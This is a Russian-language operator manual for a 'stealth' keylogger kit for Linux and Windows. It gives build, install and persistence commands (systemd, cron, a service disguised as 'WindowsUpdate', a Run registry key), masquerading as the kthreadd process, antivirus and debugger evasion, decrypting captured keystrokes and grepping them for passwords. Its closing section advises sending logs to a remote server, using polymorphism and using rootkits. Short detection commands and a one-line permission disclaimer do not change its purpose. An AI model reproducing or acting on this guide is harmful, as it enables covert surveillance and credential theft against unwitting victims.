# 🔥 Инструкция по использованию Stealth Keyloggers

## 📋 Содержание
1. [Linux Keylogger](#linux-keylogger)
2. [Windows Keylogger](#windows-keylogger)
3. [Расшифровка логов](#расшифровка-логов)
4. [Установка и удаление](#установка-и-удаление)
5. [Безопасность и обнаружение](#безопасность-и-обнаружение)

---

## 🐧 Linux Keylogger

### Быстрый старт

#### 1. Тестовый запуск (без установки)
```bash
# Требуются права root для доступа к /dev/input
sudo ./stealth_keylogger
```

Кейлоггер запустится в фоновом режиме и начнет записывать нажатия клавиш.

#### 2. Проверка работы
```bash
# Проверь что процесс запущен
ps aux | grep kthreadd

# Проверь логи (файл создается в /tmp с именем .sys_log_<PID>)
ls -la /tmp/.sys_log_*

# Расшифруй логи
./decrypt_logs /tmp/.sys_log_<PID>
```

#### 3. Установка как системный сервис
```bash
# Установка (требует root)
sudo ./install_linux.sh

# Проверка статуса
sudo systemctl status ksysmon.service

# Просмотр логов сервиса
sudo journalctl -u ksysmon.service -f
```

### Расположение логов

Кейлоггер пытается создать лог-файл в следующих местах (по приоритету):
1. `/tmp/.sys_log_<PID>` - основное место
2. `/var/tmp/.sys_log_<PID>` - альтернатива
3. `/dev/shm/.sys_log_<PID>` - shared memory

Файл создается с именем процесса (PID) для уникальности.

### Остановка кейлоггера

```bash
# Если запущен вручную
sudo pkill -f stealth_keylogger
# или
sudo killall kthreadd

# Если установлен как сервис
sudo systemctl stop ksysmon.service
```

---

## 🪟 Windows Keylogger

### Компиляция

```bash
# Установка MinGW (Ubuntu/Debian)
sudo apt-get install mingw-w64

# Компиляция
cd build
./build_windows.bat
# или вручную:
x86_64-w64-mingw32-g++ -O3 -s -mwindows \
  -o stealth_keylogger.exe ../src/windows_keylogger.cpp \
  -luser32 -lkernel32 -ladvapi32 -lntdll -lpsapi
```

### Использование

#### 1. Запуск вручную
```cmd
# Запуск от имени администратора
stealth_keylogger.exe
```

#### 2. Установка как Windows Service
```cmd
# От имени администратора
install_service.bat

# Проверка сервиса
sc query WindowsUpdate
net start WindowsUpdate
```

### Расположение логов (Windows)

Логи создаются в:
- `%TEMP%\~<PID>.tmp` - основное место
- `%LOCALAPPDATA%\Microsoft\Windows\<PID>.dat` - альтернатива
- `C:\Windows\Temp\<PID>.tmp` - fallback

### Остановка

```cmd
# Остановка сервиса
net stop WindowsUpdate
sc delete WindowsUpdate

# Убить процесс
taskkill /F /IM stealth_keylogger.exe
```

---

## 🔓 Расшифровка логов

### Linux

```bash
# Базовое использование
./decrypt_logs /tmp/.sys_log_12345

# Сохранение в файл
./decrypt_logs /tmp/.sys_log_12345 > decrypted_log.txt

# Просмотр с фильтрацией
./decrypt_logs /tmp/.sys_log_12345 | grep -i "password\|login"
```

### Windows

```cmd
# Базовое использование
decrypt_logs.exe "C:\Users\%USERNAME%\AppData\Local\Temp\~12345.tmp"

# Сохранение в файл
decrypt_logs.exe "C:\...\~12345.tmp" > decrypted.txt
```

### Формат логов

После расшифровки логи выглядят так:
```
2024-01-03 22:15:30 | Terminal | sudo su[ENTER]
2024-01-03 22:15:35 | Terminal | password123[ENTER]
2024-01-03 22:16:10 | Firefox | admin@example.com[TAB]SuperSecretPass[ENTER]
```

Формат: `[TIMESTAMP] | [WINDOW_TITLE] | [KEYSTROKES]`

---

## 🔧 Установка и удаление

### Linux - Полная установка

```bash
# Установка
sudo ./install_linux.sh

# Это создаст:
# - /usr/bin/ksysmond (бинарник)
# - /etc/systemd/system/ksysmon.service (сервис)
# - Crontab entry (@reboot)
# - /etc/init.d/ksysmon (для старых систем)
```

### Linux - Удаление

```bash
# Полное удаление
sudo ./uninstall_linux.sh

# Или вручную:
sudo systemctl stop ksysmon.service
sudo systemctl disable ksysmon.service
sudo rm /etc/systemd/system/ksysmon.service
sudo rm /usr/bin/ksysmond
sudo crontab -l | grep -v ksysmond | crontab -
sudo pkill -f ksysmond
```

### Windows - Удаление

```cmd
# Удаление сервиса
net stop WindowsUpdate
sc delete WindowsUpdate

# Удаление из автозагрузки
reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v WindowsSecurityUpdate /f

# Удаление файла
del "C:\Windows\System32\svchost.exe"  # если был скопирован туда
```

---

## 🛡️ Безопасность и обнаружение

### Техники скрытности

#### Linux
- **Маскировка процесса**: Процесс называется `kthreadd` (системный процесс ядра)
- **Daemon mode**: Работает в фоне, отвязан от терминала
- **Скрытые файлы**: Логи начинаются с точки (`.sys_log_*`)
- **Анти-отладка**: Обнаруживает ptrace, gdb, strace
- **VM detection**: Определяет виртуальные машины

#### Windows
- **Service mode**: Работает как системный сервис
- **Process hiding**: Скрывается от Task Manager
- **Anti-debugging**: PEB checks, timing attacks, hardware breakpoints
- **AV evasion**: Обнаруживает и обходит Касперский, Windows Defender и др.

### Обнаружение кейлоггера

#### Linux
```bash
# Проверка процессов
ps aux | grep -E "(kthreadd|ksysmond|stealth)"

# Проверка открытых файлов
sudo lsof | grep -E "(/dev/input|/tmp/\.sys_log)"

# Проверка сервисов
systemctl list-units | grep ksysmon

# Проверка crontab
crontab -l
sudo crontab -l

# Проверка файлов
find /tmp /var/tmp /dev/shm -name ".sys_log_*" 2>/dev/null
```

#### Windows
```cmd
# Проверка процессов
tasklist | findstr /i "stealth windowsupdate"

# Проверка сервисов
sc query | findstr /i "windowsupdate"

# Проверка автозагрузки
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"

# Проверка файлов
dir /s /a %TEMP%\~*.tmp
dir /s /a %LOCALAPPDATA%\Microsoft\Windows\*.dat
```

### Защита от обнаружения

1. **Регулярная ротация логов**: Автоматически удаляй старые логи
2. **Шифрование**: Логи уже зашифрованы XOR, но можно добавить AES
3. **Сетевая эксфильтрация**: Отправляй логи на удаленный сервер
4. **Полиморфизм**: Меняй сигнатуры бинарников
5. **Rootkit**: Используй LKM для полного скрытия (Linux)

---

## ⚠️ Важные замечания

### Легальность
- ⚠️ **Используй ТОЛЬКО на своих системах или с письменного разрешения**
- ⚠️ Несанкционированное использование незаконно
- ⚠️ Авторы не несут ответственности за неправомерное использование

### Технические ограничения
- Linux: Требуются права root для доступа к `/dev/input/*`
- Windows: Требуются права администратора для установки сервиса
- X11: Для захвата названий окон нужен `xdotool` (Linux)
- Логи зашифрованы XOR - не используй для критичных данных

### Производительность
- CPU: <1% использования
- RAM: <5MB
- Disk: Зависит от активности пользователя (~1MB/день при активном использовании)

---

## 🐛 Решение проблем

### Linux: "Permission denied" при доступе к /dev/input
```bash
# Решение: запускай от root
sudo ./stealth_keylogger
```

### Linux: Не находит клавиатуру
```bash
# Проверь доступные устройства
ls -la /dev/input/

# Проверь права
sudo chmod 644 /dev/input/event*
```

### Windows: Сервис не запускается
```cmd
# Проверь логи Event Viewer
eventvwr.msc

# Проверь права
# Запускай install_service.bat от имени администратора
```

### Логи не расшифровываются
```bash
# Проверь что используешь правильный файл
file /tmp/.sys_log_12345

# Проверь что файл не пустой
wc -l /tmp/.sys_log_12345
```

---

## 📞 Поддержка

При возникновении проблем:
1. Проверь логи компиляции
2. Убедись что все зависимости установлены
3. Проверь права доступа
4. Используй `strace`/`ltrace` для отладки (Linux)

---

**Удачи в тестировании! 🔥**

